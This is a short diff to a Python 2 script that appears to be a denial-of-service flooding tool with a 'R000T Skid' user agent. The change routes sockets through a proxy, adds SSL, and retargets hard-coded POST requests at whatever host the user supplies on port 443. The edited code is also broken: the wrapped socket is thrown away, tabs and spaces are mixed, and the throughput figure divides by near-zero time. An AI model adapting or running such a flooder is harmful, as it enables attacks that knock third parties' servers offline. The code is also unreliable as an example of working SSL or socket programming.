@@ -16,6 +16,7 @@ import socket
 import itertools
 import socks
 import time
+import ssl
 #global params
 url=''
 host=''
@@ -86,13 +87,14 @@ def httpcall(url):
         nbytes = 137438953472
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, prox, 80)
+	ssl.wrap_socket(s)
         start = time.time()
 	current = time.time() - start
 	bps = (nbytes*8)/current
 	pkt_count = 0
 	try:
 			s.connect((url,443))
-			s.send("POST / HTTP/1.1\r\nHost: r000t.com:443\r\nUser-Agent: R000T Skid\r\n\r\n")			
+			s.send("POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: R000T Skid\r\n\r\n" % url)			
 	except socket.error as e:						
 			print "b/ps: %s" % bps
 
